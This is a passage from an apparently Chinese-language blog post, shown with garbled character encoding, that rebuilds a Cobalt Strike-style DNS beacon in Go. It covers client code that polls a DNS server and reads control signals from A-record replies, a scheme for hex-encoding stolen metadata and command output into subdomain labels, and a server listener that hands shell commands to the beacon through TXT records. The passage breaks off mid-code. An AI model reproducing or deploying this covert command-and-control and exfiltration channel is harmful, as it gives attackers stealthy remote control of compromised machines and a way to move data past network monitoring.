<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">channelLookupRetry_A</span><span class="params">(domain, dnsServer <span class="type">string</span>, retry <span class="type">int</span>)</span></span> <span class="type">uint8</span> &#123;  </span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; retry; i++ &#123;  </span><br><span class="line">       <span class="keyword">if</span> signal := sendA(domain, dnsServer); signal != SIGNAL_RETRY &#123;  </span><br><span class="line">          <span class="keyword">return</span> signal  </span><br><span class="line">       &#125;  </span><br><span class="line">       time.Sleep(<span class="number">5</span> * time.Second)  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> SIGNAL_EXIT  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// sendA æˆåŠŸè¿”å› 0x00~0xFCï¼›ç½‘ç»œå±‚å¤±è´¥è¿”å› SIGNAL_RETRY  </span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sendA</span><span class="params">(domain, server <span class="type">string</span>)</span></span> <span class="type">uint8</span> &#123;  </span><br><span class="line">    <span class="comment">// åˆ›å»ºä¸€ä¸ªæ–°çš„ DNS æ¶ˆæ¯å¯¹è±¡  </span></span><br><span class="line">    m := <span class="built_in">new</span>(dns.Msg)  </span><br><span class="line">    <span class="comment">// è®¾ç½®æŸ¥è¯¢çš„åŸŸåå’Œç±»å‹ä¸º A è®°å½•  </span></span><br><span class="line">    m.SetQuestion(dns.Fqdn(domain), dns.TypeA)  </span><br><span class="line">    <span class="comment">// å¯ç”¨é€’å½’æŸ¥è¯¢  </span></span><br><span class="line">    m.RecursionDesired = <span class="literal">true</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 1. å»ºç«‹ UDP è¿æ¥ï¼ˆä»…æœ¬åœ°å»ºå¥—æ¥å­—ï¼Œæ— ç½‘ç»œæµé‡ï¼‰  </span></span><br><span class="line">    <span class="comment">// å°è¯•è¿æ¥åˆ°æŒ‡å®šçš„ DNS æœåŠ¡å™¨  </span></span><br><span class="line">    co, err := net.Dial(<span class="string">&quot;udp&quot;</span>, server)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> SIGNAL_RETRY  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">defer</span> co.Close() <span class="comment">// ç¡®ä¿å‡½æ•°è¿”å›å‰å…³é—­è¿æ¥  </span></span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 2. ç»™æ•´ä¸ªè¿æ¥åŠ è¶…æ—¶  </span></span><br><span class="line">    <span class="comment">// è®¾ç½®è¯»å†™è¶…æ—¶æ—¶é—´ä¸º 5 ç§’  </span></span><br><span class="line">    <span class="keyword">if</span> err := co.SetDeadline(time.Now().Add(<span class="number">5</span> * time.Second)); err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> SIGNAL_RETRY  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// åˆ›å»º DNS è¿æ¥å¯¹è±¡ï¼Œè®¾ç½® UDP ç¼“å†²åŒºå¤§å°ä¸º 4096    </span></span><br><span class="line">    dnsConn := &amp;dns.Conn&#123;Conn: co, UDPSize: <span class="number">4096</span>&#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 3. å‘é€ DNS æŸ¥è¯¢æ¶ˆæ¯  </span></span><br><span class="line">    <span class="keyword">if</span> err := dnsConn.WriteMsg(m); err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> SIGNAL_RETRY  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 4. æ¥æ”¶ DNS å“åº”æ¶ˆæ¯  </span></span><br><span class="line">    r, err := dnsConn.ReadMsg()  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> SIGNAL_RETRY  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 5. æ‰“å°ç¬¬ä¸€æ¡ A è®°å½•  </span></span><br><span class="line">    <span class="comment">// éå†å“åº”ä¸­çš„æ‰€æœ‰ç­”æ¡ˆ  </span></span><br><span class="line">    <span class="keyword">for</span> _, ans := <span class="keyword">range</span> r.Answer &#123;  </span><br><span class="line">       <span class="comment">// æ£€æŸ¥æ˜¯å¦ä¸º A è®°å½•ç±»å‹  </span></span><br><span class="line">       <span class="keyword">if</span> a, ok := ans.(*dns.A); ok &#123;  </span><br><span class="line">          <span class="comment">// è·å– IP åœ°å€çš„æœ€åä¸€ä¸ªå­—èŠ‚ä½œä¸ºä¿¡å·  </span></span><br><span class="line">          signal := a.A.To4()[<span class="number">3</span>]   </span><br><span class="line">          fmt.Printf(<span class="string">&quot;%s  -&gt;  %s  signal=%d(0x%02X)\n&quot;</span>, domain, a.A.String(), signal, signal)  </span><br><span class="line">          <span class="keyword">return</span> signal  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> SIGNAL_RETRY <span class="comment">// æ²¡æœ‰Aè®°å½•ä¹Ÿè¿”å›é‡è¯•ä¿¡å·  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>ï¼ˆ2ï¼‰ç¼–ç çš„é€‰æ‹©</strong></p>
<p>åœ¨æ€è·¯æ„å»ºçš„æ—¶å€™æˆ‘å°±è¯´äº†ï¼ŒåŸŸååªèƒ½ç”±æ•°å­— <code>0-9</code>  ã€è‹±æ–‡å¤§å°å†™å­—æ¯ <code>a-zA-Z</code>ã€è¿æ¥ç¬¦ <code>-</code> ã€ç‚¹å· <code>.</code>ï¼ˆä»…ä½œæ ‡ç­¾åˆ†éš”ç¬¦ï¼‰ç»„æˆï¼Œå¦‚ä½•å°†äºŒè¿›åˆ¶çš„æ•°æ®ç¼–ç æˆç¬¦åˆæ¡ä»¶çš„åŸŸåç»„åˆå°±æˆäº†æŒ‘æˆ˜ã€‚å¦‚æœä½¿ç”¨Base32ç¼–ç æ—¶ä¸€å®šè¦æ³¨æ„ä½¿ç”¨æ— å¡«å……æ–¹æ¡ˆï¼Œå³ä¸ä½¿ç”¨â€œ&#x3D;â€å¡«å……ï¼Œè¿™æ˜¯å› ä¸ºæ ¹æ®DNSæ ‡å‡†ï¼ŒåŸŸåä¸­ä¸èƒ½å¸¦â€œ&#x3D;â€ã€‚</p>
<p>æˆ‘ä¸‹æ–‡ä¸­æ˜¯é€‰æ‹©ä½¿ç”¨HEXç¼–ç ï¼Œåˆ©ç”¨ä¸»è¦è¿˜æ˜¯ç®€å•ï¼Œå¹¶ä¸”èƒ½æŠ„CS DNS Beaconçš„å®ç°ï¼Œå¦‚æœæƒ³å›ä¼ æ›´å¤šçš„æ•°æ®ï¼Œæ›´æ¨èä½¿ç”¨Base32ï¼Œè¿™æ˜¯å› ä¸ºBase32ä¸€ä¸ªå­—ç¬¦å¯¹åº”5ä½æ•°æ®ï¼Œè€ŒHEXç¼–ç ä¸€ä¸ªå­—ç¬¦å¯¹åº”4ä½æ•°æ®ã€‚</p>
<p><strong>ï¼ˆ3ï¼‰æ¡£ä½è®¾è®¡</strong></p>
<p>ç°åœ¨ä¸ºä»€ä¹ˆå›ç­”ä¸Šæ–‡ï¼ˆä¸‰ï¼‰æµé‡åˆ†ææå‡ºçš„é—®é¢˜ï¼š<strong>å›ä¼ çš„æ•°æ®è¦å¦‚ä½•æ„é€ ï¼Ÿ</strong></p>
<p><strong>æŒ‰ç…§CSçš„åšæ³•æ˜¯</strong>ï¼š</p>
<p>ä½¿ç”¨HEXç¼–ç ï¼Œæ¯2ä¸ªå­—ç¬¦å¯¹åº”ä¸€ä¸ªå­—èŠ‚ï¼Œæ¯8ä¸ªå­—ç¬¦ä¸ºä¸€ç»„ï¼Œä¸€ç»„å¾—åˆ°4ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œåˆšå¥½å¯¹åº”32ä½ï¼ˆint32ï¼‰ï¼Œä¸€ä¸ªæ ‡ç­¾æœ€å¤šä¸º63ä¸ªå­—ç¬¦ï¼Œä¹Ÿå°±æ„å‘³ç€ä¸€ä¸ªæ ‡ç­¾æœ€å¤§æœ‰7ç»„ï¼Œèƒ½æºå¸¦28ä¸ªå­—èŠ‚çš„æ•°æ®ã€‚</p>
<p>ä¸ºäº†ä½¿ä¼ è¾“æ•ˆç‡æœ€å¤§åŒ–ï¼Œå•ä¸ªæ ‡ç­¾åº”è¯¥ä»…èƒ½è¾¾åˆ°56ä¸ªå­—ç¬¦ï¼Œå½“ç„¶ä¸ºäº†ä½¿æ¡£ä½å˜åŒ–æ›´ä¸ºå¹³æ»‘ï¼Œå®é™…åšæ³•æ˜¯åŒä¸€ä¸ªæ¡£ä½ç”¨äºä¼ è¾“çš„æ ‡ç­¾çš„å­—ç¬¦å°½å¯èƒ½ä¸ªæ•°ä¿æŒä¸€è‡´ã€‚æ¯”å¦‚è¯´3æ¡£ä½éœ€è¦3ä¸ªæ ‡ç­¾ä¼ è¾“æ•°æ®ï¼Œæ¯ä¸ªæ ‡ç­¾åº”è¯¥ä¸º56ä¸ªå­—ç¬¦ã€‚å½“ç„¶éƒ½æœ‰ä¾‹å¤–ï¼Œæ¯”å¦‚4æ¡£éœ€è¦4ä¸ªæ ‡ç­¾ï¼Œç¬¬ä¸€ä¸ªæ ‡ç­¾40ä¸ªå­—ç¬¦ï¼Œè€Œåé¢çš„3ä¸ªæ ‡ç­¾æ¯ä¸ªéƒ½æ˜¯56ä¸ªå­—ç¬¦ã€‚è¯¦ç»†è§ä¸‹è¡¨æ ¼ã€‚</p>
<p> <strong>å¹³æ»‘é™çº§</strong>ï¼šæ¡£ä½å˜åŒ–å¹³æ»‘ï¼ˆå¦‚104Bâ†’84Bâ†’56Bâ†’â€¦ï¼‰ï¼Œæ ¹æ®å‰©ä½™ä¼ è¾“æ•°æ®é•¿åº¦å¹³æ»‘é™æ¡£ã€‚</p>
<p><strong>æ¨¡æ¿</strong>ï¼š</p>
<ul>
<li>é•¿åº¦ï¼š<code>www.&lt;lablecount&gt;.&lt;é•¿åº¦&gt;.&lt;reqno+nonce&gt;.&lt;agentid&gt;.&lt;domain&gt;</code></li>
<li>æ•°æ®ï¼š<code>www.&lt;lablecount&gt;.&lt;hex-seg-1&gt;.&lt;hex-seg-2&gt;...&lt;hex-seg-N&gt;.&lt;reqno+nonce&gt;.&lt;agentid&gt;.&lt;domain&gt;</code></li>
</ul>
<table>
<thead>
<tr>
<th>æ¡£ä½</th>
<th>æ¯æ¬¡å‘é€å­—èŠ‚æ•°</th>
<th>æ•°æ®å—æ•°é‡</th>
<th>åˆ†ç»„æ–¹å¼</th>
<th>æœ€å¤§åŸŸåé•¿åº¦ä¼°ç®—</th>
</tr>
</thead>
<tbody><tr>
<td>4</td>
<td>104 B</td>
<td>26 ç»„</td>
<td>5+7+7+7</td>
<td>26Ã—8 + å›ºå®šéƒ¨åˆ† â‰ˆ 208å­—ç¬¦</td>
</tr>
<tr>
<td>3</td>
<td>84 B</td>
<td>21 ç»„</td>
<td>7+7+7</td>
<td>21Ã—8 + å›ºå®šéƒ¨åˆ† â‰ˆ 168å­—ç¬¦</td>
</tr>
<tr>
<td>2a</td>
<td>56 B</td>
<td>14 ç»„</td>
<td>7+7</td>
<td>14Ã—8 + å›ºå®šéƒ¨åˆ† â‰ˆ 112å­—ç¬¦</td>
</tr>
<tr>
<td>2b</td>
<td>48 B</td>
<td>12 ç»„</td>
<td>6+6</td>
<td>12Ã—8 + å›ºå®šéƒ¨åˆ† â‰ˆ 96å­—ç¬¦</td>
</tr>
<tr>
<td>2c</td>
<td>40 B</td>
<td>10 ç»„</td>
<td>5+5</td>
<td>10Ã—8 + å›ºå®šéƒ¨åˆ† â‰ˆ 80å­—ç¬¦</td>
</tr>
<tr>
<td>1a</td>
<td>28 B</td>
<td>7 ç»„</td>
<td>7</td>
<td>7Ã—8 + å›ºå®šéƒ¨åˆ† â‰ˆ 56å­—ç¬¦</td>
</tr>
<tr>
<td>1b</td>
<td>24 B</td>
<td>6 ç»„</td>
<td>6</td>
<td>6Ã—8 + å›ºå®šéƒ¨åˆ† â‰ˆ 48å­—ç¬¦</td>
</tr>
<tr>
<td>1c</td>
<td>20 B</td>
<td>5 ç»„</td>
<td>5</td>
<td>5Ã—8 + å›ºå®šéƒ¨åˆ† â‰ˆ 40å­—ç¬¦</td>
</tr>
<tr>
<td>1d</td>
<td>16 B</td>
<td>4 ç»„</td>
<td>4</td>
<td>4Ã—8 + å›ºå®šéƒ¨åˆ† â‰ˆ 32å­—ç¬¦</td>
</tr>
<tr>
<td>1e</td>
<td>12 B</td>
<td>3 ç»„</td>
<td>3</td>
<td>3Ã—8 + å›ºå®šéƒ¨åˆ† â‰ˆ 24å­—ç¬¦</td>
</tr>
<tr>
<td>1f</td>
<td>8 B</td>
<td>2 ç»„</td>
<td>2</td>
<td>2Ã—8 + å›ºå®šéƒ¨åˆ† â‰ˆ 16å­—ç¬¦</td>
</tr>
<tr>
<td>0</td>
<td>4 B</td>
<td>1 ç»„</td>
<td>1</td>
<td>1Ã—8 + å›ºå®šéƒ¨åˆ† â‰ˆ 8å­—ç¬¦</td>
</tr>
</tbody></table>
<p>å¯ä»¥çœ‹åˆ°ä¸Šè¡¨ä¸­ï¼Œæ¯ä¸ªæ¡£ä½éƒ½æ˜¯4Bçš„æ•´æ•°å€ï¼Œè¿™æ—¶ä½ å¯èƒ½ä¼šæœ‰ä¸€ä¸ªç–‘é—®ï¼š<strong>è¦ä¼ è¾“çš„æ•°æ®ä¸æ˜¯4Bçš„æ•´æ•°å€è¦æ€ä¹ˆå¤„ç†ï¼Ÿ</strong></p>
<p>å¦‚æœè¦ä¼ è¾“çš„æ•°æ®ä¸æ˜¯4Bçš„æ•´æ•°å€ï¼ŒæŒ‰ç…§<strong>å¹³æ»‘é™çº§</strong>åŸåˆ™ï¼Œæœ€ç»ˆä¸€å®šä¼šæ˜¯è¿™å‡ ç§æƒ…å†µï¼šâ‘ å‰©ä½™1Bï¼›â‘¡å‰©ä½™2Bï¼›â‘¢å‰©ä½™3Bï¼ŒæŒ‰ç…§CSçš„åšæ³•æ˜¯<strong>ä½ ä¸å¤Ÿæˆ‘å°±ç»™ä½ é«˜ä½è¡¥0ï¼Œæ¥åˆ°4Bå¤§å°</strong>ï¼Œåˆšå¥½å¯¹åº”æœ€åä¸€æ¡£ã€‚å¯ä»¥çœ‹åˆ°ä¸‹å›¾ï¼Œåˆå§‹åŒ–äº†ä¸€ä¸ªå…¨ä¸º0çš„ <code>unsigned int</code> çš„dataå˜é‡ï¼Œæ‰€ä»¥å³ä½¿è¦ä¼ è¾“çš„æ•°æ®ä¸å¤Ÿ4Bä¹Ÿç®—æŒ‰4Bå‘é€ï¼Œé«˜ä½è¿˜æ˜¯0ï¼Œä¸å½±å“ã€‚</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/20/18-32-12-ec8a75d4664bb4952e74e471423744b1-20250920183212-9890d3.png"></p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/20/18-30-15-8abbb32afc8bc8b08236a2bea706db23-20250920183015-51cb97.png"></p>
<p>ä¸Šé¢å·²ç»å¤§è‡´ä»‹ç»CSçš„åŸŸåæ„é€ çš„åŸç†äº†ï¼Œä¸‹é¢å°±æ˜¯è¦ä»‹ç»ä»£ç çš„å®ç°ï¼Œæˆ‘ä»¬å¯ä»¥æŒ‰ç…§CSçš„é£æ ¼å†™å‡ºGoè¯­è¨€çš„ä»£ç ã€‚</p>
<p>ç”±äºä»£ç å®åœ¨å¤ªå¤šäº†æˆ‘å°±ä¸æ”¾åœ¨æ–‡ç« ï¼Œæˆ‘ç®€è¦åœ°è¯´ä¸€ä¸‹ <code>DNSPut</code> æ˜¯ç”¨æ¥å°†æ•°æ®å›ä¼ ç»™Serverçš„ï¼Œè¿™äº›æ•°æ®å¯ä»¥æ˜¯<strong>metadata</strong> ä¹Ÿå¯ä»¥æ˜¯<strong>ä»»åŠ¡æ‰§è¡Œåçš„ç»“æœ</strong>ï¼Œ<code>DNSPut</code> çš„ä¸»è¦æ€è·¯æ˜¯ï¼š</p>
<ol>
<li>é€šè¿‡ <code>length</code> è®°å½•æ•°æ®çš„æ€»é•¿åº¦ï¼Œ <code>sent</code> æ¥è®°å½•å·²å‘é€çš„å­—èŠ‚æ•°ï¼Œå½“ <code>sentå°äºlength</code> ä½œä¸ºå¾ªç¯æ¡ä»¶ä¸æ–­åœ°å‘é€æ•°æ®ã€‚</li>
<li>æŒ‰ç…§â€œ<strong>è´ªå¿ƒç­–ç•¥</strong>â€æ¦¨å¹²æ¯ä¸€åˆ†é•¿åº¦ï¼Œé¢„å®šä¹‰äº†104ã€84ã€56ã€48ã€40ã€28ã€24ã€20ã€16ã€12ã€8ã€4å­—èŠ‚è¿™12æ¡£â€œå¥—é¤â€ï¼Œæ¯æ¬¡ä»<strong>å¤§åˆ°å°</strong>å°è¯•ã€‚</li>
<li><strong>åŸŸåæ„é€ </strong>ï¼šç”±äºæ¡£ä½å¤ªå¤šä¸”æ„é€ ç›¸ä¼¼ï¼Œæ‰€ä»¥æˆ‘å°±åªä»‹ç»104å­—èŠ‚æ—¶åŸŸåçš„æ„é€ ã€‚å…·ä½“åšæ³•æ˜¯å®šä¹‰ä¸€ä¸ª <code>uint32</code> ç±»å‹çš„ <code>dataz</code> ä»å¸¦å‘é€æ•°æ®copyä¸€ä»½å›ºå®šé•¿åº¦æ•°æ®åˆ° <code>dataz</code> æ•°ç»„ä¸­ï¼Œç„¶åæŒ‰ç…§ <code>%08x</code> æ ¼å¼åŒ–æ•°ç»„ä¸­çš„æ¯ä¸€ä¸ªå…ƒç´ ï¼Œæ‰€è°“çš„ <code>%08x</code> å°±æ˜¯å°†32ä½æ•°æ®æŒ‰ç…§16è¿›åˆ¶çš„æ ¼å¼è¾“å‡ºæˆ8ä¸ªå­—ç¬¦ï¼Œæ¯”å¦‚è¯´ï¼Œ<code>255</code> -&gt; <code>000000ff</code>ï¼Œè¯¦è§ä¸‹å›¾</li>
</ol>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/21/11-18-48-22adeeba5f2ffa8bdb96d3d27273a3f8-20250921111848-bc60c6.png"></p>
<p>å¾ªç¯çš„å°¾éƒ¨å°±æ˜¯æ‰§è¡ŒDNSæŸ¥è¯¢ï¼Œè§ä¸‹å›¾</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/22/19-37-37-cc35475e3ddf3ead96ea21b0c589d557-20250922193737-212564.png"></p>
<h3 id="ï¼ˆäºŒï¼‰è§£æå›ä¼ æ•°æ®-server"><a href="#ï¼ˆäºŒï¼‰è§£æå›ä¼ æ•°æ®-server" class="headerlink" title="ï¼ˆäºŒï¼‰è§£æå›ä¼ æ•°æ®-server"></a>ï¼ˆäºŒï¼‰è§£æå›ä¼ æ•°æ®-server</h3><p>å‡½æ•°è°ƒç”¨é“¾å¦‚ä¸‹ï¼Œå®é™…ä¹Ÿæ˜¯æˆ‘ç¼–å†™ä»£ç çš„é¡ºåº</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ListenerStart</span><br><span class="line">	-&gt;processRequest</span><br><span class="line">		-&gt;handleA</span><br><span class="line">			-&gt;CallbackDataHandler</span><br><span class="line">	-&gt;processResponse</span><br></pre></td></tr></table></figure>

<p>å…ˆç”¨ <code>ListenerStart</code> å¯åŠ¨DNSç›‘å¬å™¨ã€‚<code>processRequest</code> å¤„ç†æ‰€æœ‰ç±»å‹çš„DNSæŸ¥è¯¢ï¼Œè€Œ <code>processResponse</code> å°†æˆ‘ä»¬ç²¾å¿ƒæ„é€ çš„DNSå“åº”æŠ¥æ–‡è¿”å›ç»™Beaconã€‚</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ListenerStart</span><span class="params">(addr <span class="type">string</span>)</span></span> <span class="type">error</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// æ³¨å†ŒDNSæŸ¥è¯¢å¤„ç†å‡½æ•°ï¼Œæ‰€æœ‰æŸ¥è¯¢ï¼ˆæ— è®ºæŸ¥è¯¢åæ˜¯ä»€ä¹ˆï¼‰éƒ½ä¼šè¿›å…¥è¿™ä¸ªé—­åŒ…å‡½æ•°å¤„ç†ã€‚  </span></span><br><span class="line">    dns.HandleFunc(<span class="string">&quot;.&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w dns.ResponseWriter, r *dns.Msg)</span></span> &#123;  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// åˆ›å»ºä¸€ä¸ªç©ºç™½çš„dnsæŠ¥æ–‡å¹¶æŠŠè¯·æ±‚å¤´å¤åˆ¶è¿›å»ï¼Œä¿è¯IDã€QRã€RDç­‰æ ‡å¿—ä½ç¬¦åˆè§„èŒƒã€‚  </span></span><br><span class="line">       reply := <span class="built_in">new</span>(dns.Msg)  </span><br><span class="line">       reply.SetReply(r)  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// åªå…³å¿ƒç¬¬ä¸€æ¡Questionï¼Œå¿½ç•¥å…¶ä½™ã€‚  </span></span><br><span class="line">       <span class="keyword">if</span> <span class="built_in">len</span>(r.Question) &gt; <span class="number">0</span> &#123;  </span><br><span class="line">  </span><br><span class="line">          <span class="comment">// ç”±processRequestå¤„ç†ä»»åŠ¡è·å–è¯·æ±‚ï¼Œå¹¶ç”Ÿæˆåº”ç­”  </span></span><br><span class="line">          q := r.Question[<span class="number">0</span>]  </span><br><span class="line">          rrs := processRequest(q.Name, q.Qtype)  </span><br><span class="line">          reply.Answer = rrs  </span><br><span class="line">  </span><br><span class="line">       &#125;  </span><br><span class="line">       processResponse(w, reply)  </span><br><span class="line">    &#125;)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// å¯åŠ¨dnsæœåŠ¡å™¨ç›‘å¬  </span></span><br><span class="line">    server := &amp;dns.Server&#123;Addr: addr, Net: <span class="string">&quot;udp&quot;</span>&#125;  </span><br><span class="line">    log.Println(<span class="string">&quot;[ListenerStart] listening on&quot;</span>, addr)  </span><br><span class="line">    <span class="keyword">return</span> server.ListenAndServe()  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>processRequest</code>ï¼šè¯´æ˜¯å¤„ç†æ‰€æœ‰ç±»å‹ï¼Œå®é™…æˆ‘ä»¬åªç”¨å¤„ç† <code>A</code> å’Œ <code>TXT</code> è®°å½•æŸ¥è¯¢è¯·æ±‚ã€‚</p>
<ol>
<li>å¯¹äºæŸ¥è¯¢ç±»å‹ä¸º <code>TXT</code> çš„ï¼Œæˆ‘ä»¬å°†Txtå­—æ®µèµ‹å€¼å‘½ä»¤æ•°æ®ã€‚</li>
<li>å¯¹äºæŸ¥è¯¢ç±»å‹ä¸º <code>A</code> çš„ï¼Œæˆ‘ä»¬è¿”å›Aå­—æ®µèµ‹å€¼IPv4åœ°å€ï¼ŒIpv4åœ°å€çš„æœ€åä¸€ä¸ªå­—èŠ‚å¯ä»¥ä»å½“æ§åˆ¶ä¿¡å·ã€‚</li>
</ol>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">processRequest</span><span class="params">(qName <span class="type">string</span>, qType <span class="type">uint16</span>)</span></span> []dns.RR &#123;  </span><br><span class="line">    name := strings.ToLower(qName)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">switch</span> qType &#123;  </span><br><span class="line">    <span class="keyword">case</span> dns.TypeTXT:  </span><br><span class="line">       <span class="keyword">return</span> []dns.RR&#123;  </span><br><span class="line">          &amp;dns.TXT&#123;  </span><br><span class="line">             Hdr: dns.RR_Header&#123;  </span><br><span class="line">                Name:   name,  </span><br><span class="line">                Rrtype: dns.TypeTXT,  </span><br><span class="line">                Class:  dns.ClassINET,  </span><br><span class="line">                Ttl:    <span class="number">30</span>,  </span><br><span class="line">             &#125;,  </span><br><span class="line">             Txt: []<span class="type">string</span>&#123;currCmd&#125;,  </span><br><span class="line">          &#125;,  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">case</span> dns.TypeA:  </span><br><span class="line">       ip := handleA(name)  </span><br><span class="line">       <span class="keyword">return</span> []dns.RR&#123;  </span><br><span class="line">          &amp;dns.A&#123;  </span><br><span class="line">             Hdr: dns.RR_Header&#123;  </span><br><span class="line">                Name:   name,  </span><br><span class="line">                Rrtype: dns.TypeA,  </span><br><span class="line">                Class:  dns.ClassINET,  </span><br><span class="line">                Ttl:    <span class="number">30</span>,  </span><br><span class="line">             &#125;,  </span><br><span class="line">             A: ip,  </span><br><span class="line">          &#125;,  </span><br><span class="line">       &#125;  </span><br><span class="line">    <span class="keyword">default</span>:  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">nil</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>handleA</code> å¯¹äº â€œwwwâ€å’Œâ€postâ€ å‰ç¼€ï¼Œä¼šè¿›ä¸€æ­¥è°ƒç”¨ <code>CallbackDataHandler</code> å¤„ç†å›ä¼ çš„æ•°æ®ï¼Œè€Œå¯¹äºâ€œapiâ€å‰ç¼€ï¼Œæˆ‘åªè¿”å›ä¸€ä¸ªipä½œä¸ºæ§åˆ¶ä¿¡å·ï¼Œ<code>192.168.1.2</code> çš„æœ€åä¸€ä¸ªå­—èŠ‚ <code>2</code> è¡¨ç¤ºè¦æ‰§è¡Œ <code>shell</code> å‘½ä»¤ã€‚è¿˜æ˜¯é‚£å¥è¯æˆ‘å¯¹äºè¿™é‡Œçš„æ§åˆ¶ä¿¡å·ä¸æ˜¯å¾ˆæ»¡æ„ï¼Œåç»­æœ‰æœºä¼šè¿˜ä¼šæ”¹è¿›ï¼Œç”šè‡³æ”¾å¼ƒæ§åˆ¶ä¿¡å·ã€‚</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td 